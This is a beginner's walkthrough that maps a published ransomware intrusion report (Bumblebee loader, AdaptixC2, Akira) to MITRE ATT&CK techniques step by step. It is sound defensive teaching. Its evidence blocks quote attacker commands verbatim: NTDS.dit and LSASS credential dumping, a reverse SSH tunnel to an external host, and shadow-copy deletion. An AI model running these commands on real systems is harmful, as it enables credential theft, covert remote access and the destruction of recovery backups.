# Reading your first DFIR report and mapping it to ATT&CK

A step-by-step walkthrough using The DFIR Report's ["From Bing Search to
Ransomware: Bumblebee and AdaptixC2 Deliver Akira"](https://thedfirreport.com/2026/06/29/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-3/).

The companion file `bumblebee-adaptixc2-akira.md` is the finished analysis.
This file shows the *reasoning* that produces it — how you get from a command
line in a report to a technique ID, and why a given ID is the right one.

---

## Part 1: The four levels of abstraction

Almost all confusion when starting out comes from mixing these up.

| Level | Question it answers | Example |
|---|---|---|
| **Tactic** | *Why* did the adversary do this? | Credential Access |
| **Technique** | *How* did they do it, broadly? | T1003 OS Credential Dumping |
| **Sub-technique** | *Which specific variant?* | T1003.003 NTDS |
| **Procedure** | *What literally happened?* | `wbadmin.exe start backup -include:C:\windows\NTDS\ntds.dit` |

A DFIR report gives you **procedures**. Your job is to climb one level up to
**techniques**. That climb is the whole skill.

Two things follow from this table:

- **A technique can serve several tactics.** T1078 Valid Accounts appears under
  Initial Access, Persistence, Privilege Escalation, *and* Stealth. Asking
  "which tactic is T1078?" is the wrong question — ask "what was the adversary
  *achieving* with it here?"
- **Never map to a tool name.** "They used FileZilla" is not a technique.
  "They moved 77 GB out over SFTP to a server they controlled" is
  T1048.002. Tools change; behavior is what generalizes, and that is exactly
  why ATT&CK is organized this way.

---

## Part 2: The report is already half-mapped

Open the report and look at the section headings:

> Initial Access · Execution · Persistence · Privilege Escalation ·
> Defense Evasion · Credential Access · Discovery · Lateral Movement ·
> Collection · Command and Control · Exfiltration · Impact

**Those are ATT&CK tactics.** DFIR reports are written in ATT&CK's structure,
so the "why" column is handed to you for free. When you read something under
*Credential Access*, you already know the goal was to obtain credentials; you
only need to work out which technique.

One catch specific to this repository: this report uses **Defense Evasion**,
which ATT&CK **removed in v19**. It was split into two tactics — **Stealth**
(hiding: side-loading, injection, deleting files) and **Defense Impairment**
(breaking things: killing AV, clearing logs). So the report's Defense Evasion
section maps to two different tactics now. This is normal. Reports are written
against whatever ATT&CK version was current, and the framework keeps moving.

---

## Part 3: The mapping loop

For every distinct action in the report, run this loop:

1. **Write down the evidence verbatim** — the command line, the filename, the
   event ID. Do not paraphrase yet.
2. **Ask what the adversary was trying to achieve.** Not what the tool does —
   what the human wanted. That gives you the tactic.
3. **Search ATT&CK for it**, using words describing the *behavior*:
   ```bash
   python3 util/attack_lookup.py search ntds credential
   ```
4. **Read the candidate's description** and check it actually matches your
   evidence:
   ```bash
   python3 util/attack_lookup.py technique T1003.003 --full
   ```
5. **Pick the most specific level the evidence supports.** More on this below.

### The specificity rule

Go as specific as the evidence *proves*, and no further.

- Report says "they dumped credentials" with no detail → map **T1003**
  (parent). You do not know which variant.
- Report says `wbadmin.exe ... -include:C:\windows\NTDS\ntds.dit` → map
  **T1003.003 NTDS**. The evidence names the specific target.

Over-specifying is a real error: it puts a claim in your report that your
evidence cannot support. Under-specifying loses detection value, because
sub-techniques carry different detection strategies. When in doubt, map the
parent and write a note saying why.

---

## Part 4: Walking the intrusion

Now the chain itself. Each step shows evidence → reasoning → technique.

### Phase 1 — Getting in (Initial Access)

**Evidence:** An IT admin searched Bing for "ManageEngine OpManager", landed on
`opmanager[.]pro`, was redirected to `download-center[.]online`, and downloaded
an MSI installer.

**Reasoning:** Two separate things happened, and beginners usually map only one.

*First*, the adversary manipulated search rankings so their fake site appeared
for a legitimate query. That is preparation done *before* touching the victim —
ATT&CK calls that the **Resource Development** tactic.

```bash
python3 util/attack_lookup.py search seo poisoning
```
→ **T1608.006 SEO Poisoning**

*Second*, the victim visited that site and got malware. Browsing to a site and
receiving a payload is:

→ **T1189 Drive-by Compromise**

**Lesson:** one paragraph of a report often contains several techniques across
different tactics. Splitting "what the adversary set up" from "what happened to
the victim" catches a lot of them. (The published report maps only T1189 and
misses T1608.006 — even professional mappings drop things.)

### Phase 2 — Running the malware (Execution)

**Evidence:** The victim copied the MSI to an internal network share. An IT
administrator then ran it from there. `explorer.exe` is the parent process.

**Reasoning:** `explorer.exe` as parent means a human double-clicked it — the
malware did not launch itself. That distinction has a technique:

→ **T1204.002 Malicious File** (under the User Execution parent — a *user* had
to act)

**Lesson:** parent process tells you *who* initiated something. `explorer.exe`
= human. `WmiPrvSE.exe` = remote WMI. `services.exe` = a service. Learn to read
parent processes and half the execution mapping becomes automatic.

### Phase 3 — Hiding in a trusted process (Stealth)

**Evidence:** The MSI dropped three files into
`%TEMP%\ApplicationInstallationFolder_11`: the real OpManager installer,
`consent.exe` (a genuine, signed Microsoft binary), and `msimg32.dll`
(malicious). Running `consent.exe` from that folder made Windows load the local
malicious `msimg32.dll` instead of the real one in `C:\Windows\System32`.

**Reasoning:** Windows looks for a DLL in the program's own folder before
`System32`. Putting a legitimate binary in a folder you control, next to a
malicious DLL it expects to load, means your code runs inside a trusted,
signed process.

→ **T1574.001 DLL** (under Hijack Execution Flow)

The real installer being present too is deliberate — the admin sees OpManager
install successfully and suspects nothing:

→ **T1036.005 Match Legitimate Resource Name or Location**

**Lesson:** ask "what makes this *look* normal?" Answers to that question are
almost always Stealth techniques.

### Phase 4 — Establishing control (Command and Control)

**Evidence:** The loader first called `GetSystemDefaultLocaleName()` and
compared against 27 CIS-region locales, exiting if matched. It then queried
many random-looking 14-character `.org` domains, eventually reaching
`188.40.187[.]145:443`.

**Reasoning:** Three techniques here.

The locale check is the malware *learning about the host* — that is Discovery,
even though it happens for the adversary's own safety:
→ **T1614.001 System Language Discovery**

The random domain names are algorithmically generated so defenders cannot
pre-block them:
→ **T1568.002 Domain Generation Algorithms**

Reaching out over 443 (HTTPS):
→ **T1071.001 Web Protocols**

**Lesson:** malware behavior counts as adversary behavior. The loader checking
locale is Discovery even though no human typed a command.

### Phase 5 — Upgrading access

**Evidence:** Five hours later, `AdgNsy.exe` appeared — forensics showed it was
a renamed copy of the legitimate `WAB.exe` (Windows Address Book). It was
launched via WMI, so its parent was `WmiPrvSE.exe`. Sysmon Event 10 showed
`consent.exe` opening a handle to it. Memory analysis found RWX regions and a
thread whose entry point sat outside the file's image.

**Reasoning:** Read this as four separate facts:

| Fact | Technique |
|---|---|
| Legitimate binary renamed | T1036.003 Rename Legitimate Utilities |
| Launched via WMI | T1047 Windows Management Instrumentation |
| One process writes into another's memory | T1055 Process Injection |
| Resulting HTTP beacon | T1071.001 Web Protocols |

"RWX regions" and "unbacked thread entry point" are the standard forensic
fingerprints of injected code — code living in memory that came from no file on
disk. Worth memorizing; you will see that phrasing constantly.

### Phase 6 — Looking around (Discovery)

**Evidence:**

```
whoami /groups          systeminfo         quser
nltest /dclist:         nltest /domain_trusts
net group "domain admins" /dom             net localgroup administrators
ping -n 1 <host>        dir C:\programdata
```

**Reasoning:** Discovery is the easiest tactic to map, because these commands
map almost one-to-one. But notice the pairs that differ only by scope:

| Command | Technique |
|---|---|
| `net localgroup administrators` | T1069.001 **Local** Groups |
| `net group "domain admins" /dom` | T1069.002 **Domain** Groups |
| `net user administrator` | T1087.001 **Local** Account |
| `net user ... /dom` | T1087.002 **Domain** Account |

**Lesson:** the `/dom` flag is the difference between two technique IDs. This
level of detail is exactly why you read the command line rather than the prose
summary.

### Phase 7 — Getting the crown jewels (Credential Access)

**Evidence:**

```
wbadmin.exe start backup -backuptarget:\\127.0.0.1\C$\ProgramData\
  -include:C:\windows\NTDS\ntds.dit,C:\windows\system32\config\SYSTEM,
  C:\windows\system32\config\SECURITY -quiet
```

**Reasoning:** `ntds.dit` is the Active Directory database — every domain
user's password hash. It cannot be copied while Windows has it open, so
adversaries use a backup or shadow-copy tool to get a consistent copy. Here
that tool is the built-in `wbadmin.exe`; the SYSTEM and SECURITY hives are
taken too because they hold the keys needed to decrypt it.

→ **T1003.003 NTDS**

**Why this step matters most:** with the AD database, the adversary has every
account's hash. Password resets afterwards are a full-domain exercise, not a
cleanup. This is the point where the incident stopped being recoverable by
containment alone — about twenty hours before the ransomware ran.

Then LSASS dumping on three hosts:

```
rundll32.exe C:\windows\System32\comsvcs.dll, #+000024 <PID> \Windows\Temp\<random>.<ext> full
```
→ **T1003.001 LSASS Memory**

`comsvcs.dll` has an exported function that dumps a process's memory. LSASS
holds credentials for logged-on users. Using a signed Microsoft DLL to do it
avoids bringing in a tool like Mimikatz — a **living-off-the-land** technique,
a phrase you will meet in every modern report.

### Phase 8 — Moving and tunneling

**Evidence:**

```
ssh root@193.242.184[.]150 -R *:10400 -p22
```

**Reasoning:** `-R` is a *reverse* port forward. Normally the firewall blocks
inbound connections, so the adversary cannot RDP in from outside. Instead a
machine *inside* the network makes an outbound SSH connection — which firewalls
usually allow — and that connection is then used backwards, to carry the
adversary's RDP traffic in. The firewall never sees an inbound connection.

Two techniques, and this is the distinction the published report gets wrong:

→ **T1572 Protocol Tunneling** — wrapping one protocol (RDP) inside another (SSH)
→ **T1090.002 External Proxy** — bouncing traffic through an external host

**Lesson:** when two techniques both seem to fit, check whether they describe
*different aspects* rather than competing for the same one. Here, tunneling
describes the encapsulation and proxy describes the routing. Both are true.
The published table lists only T1090.

### Phase 9 — Taking the data (Exfiltration)

**Evidence:** FileZilla was installed on the file server. Zeek logs show two
sessions to `185.174.100[.]203:22` — 39.28 GB over 4.5 hours, then 41.77 GB —
with client string `SSH-2.0-FileZilla_3.68.1`.

**Reasoning:** Data left over SFTP, which is a *different* channel from the
malware's HTTP C2. That distinction is what ATT&CK's T1048 family is for:
exfiltration over a **non-C2** protocol.

Now the sub-technique, and this one is genuinely subtle:

- **T1048.001** = symmetric encryption — the adversary implemented their *own*
  crypto with a manually shared key
- **T1048.002** = asymmetric encryption — a standard protocol like TLS or SSH
  doing key exchange for them

SFTP runs over SSH, which does asymmetric key exchange. So:
→ **T1048.002**

The published report maps T1048.001. Read both descriptions and you will see
why that is wrong:

```bash
python3 util/attack_lookup.py technique T1048.001 T1048.002 --full
```

**Lesson:** when two sub-techniques sound similar, read both full descriptions
before choosing. Never pick on the name alone. Published reports get these
wrong, so verifying is not arrogance — it is the job.

### Phase 10 — Impact

**Evidence:**

```
locker.exe -p=G:\ -n=15
powershell.exe -Command "Get-WmiObject Win32_Shadowcopy | Remove-WmiObject"
```

**Reasoning:** `-p` is the path to encrypt; `-n=15` encrypts only 15% of each
file — fast, and still destructive, since a partially encrypted file is
useless.

→ **T1486 Data Encrypted for Impact**

Shadow copies are Windows' built-in backups. Deleting them removes the victim's
easiest recovery path and is why the ransom demand has leverage.

→ **T1490 Inhibit System Recovery**

The deletion runs within one second of each encryption — automated inside the
ransomware, not typed by a human.

---

## Part 5: Building the timeline

Once mapped, put the steps on a clock. This is where a report starts answering
"what should we have done":

| Time | Event |
|---|---|
| 0h | MSI executed, Bumblebee loader runs |
| +5h | AdaptixC2 beacon, discovery begins |
| ~day 1 | Domain accounts created, escalated to Enterprise Admins |
| ~24h | **NTDS.dit stolen** — domain credentials gone |
| day 3 | LSASS dumps, reverse SSH tunnel, SYSVOL exfiltrated |
| +39h | FileZilla installed, 77 GB exfiltrated |
| **+44h** | **Akira ransomware deployed** |
| day 5 | Actor returns, encrypts child domain |

Two things fall out immediately. **44 hours is fast** — there was time to
intervene, but not much. And **the NTDS theft at ~24h is the point of no
return**: everything after it was the adversary using credentials they already
owned.

---

## Part 6: Common beginner mistakes

1. **Mapping tools instead of behaviors.** "RustDesk" is not a technique;
   T1219.002 Remote Desktop Software is. Ask what the tool *accomplished*.
2. **Guessing sub-techniques.** If the report says "credential dumping" with no
   detail, map the parent. Do not pick a variant to look precise.
3. **Mapping from memory.** Technique IDs get revoked. **T1562.001 was revoked
   in v19** in favor of T1685 — map it from memory and you cite an ID that no
   longer exists. Always verify:
   ```bash
   python3 util/attack_lookup.py validate T1562.001
   ```
4. **Mapping capability instead of evidence.** ATT&CK lists 39 techniques for
   Bumblebee (S1039). Those are things Bumblebee *can* do across all known
   cases — not what it did here. Only map what this report observed.
5. **Stopping at one technique per paragraph.** Phase 5 above had four in a
   single sentence.
6. **Trusting the report's own table.** It is a strong starting point, not
   ground truth. This one has an incorrect sub-technique, four mappings less
   specific than their evidence, and nine substantive omissions.

---

## Part 7: Practising

Take any paragraph of a report and run the loop by hand:

```bash
# 1. What behavior is described? Search for it.
python3 util/attack_lookup.py search <keywords>

# 2. Read the candidate in full. Does it really match?
python3 util/attack_lookup.py technique T#### --full

# 3. Who else does this? Useful sanity check.
python3 util/attack_lookup.py technique T#### -r

# 4. How would you catch it?
python3 util/attack_lookup.py technique T#### -d

# 5. Check the report's own IDs are still valid.
python3 util/attack_lookup.py validate T#### T####

# 6. Visualise the whole intrusion.
python3 util/attack_lookup.py layer T#### T#### --out layer.json
```

Upload the layer to the [ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/)
to see the intrusion spread across the matrix. Seeing which tactics light up —
and which stay empty — is the fastest way to build intuition for what a
complete intrusion looks like.

Then compare your mapping against `bumblebee-adaptixc2-akira.md`. Where you
disagree, work out *why*. Disagreements over parent-versus-sub-technique are
normal and are where the learning happens.
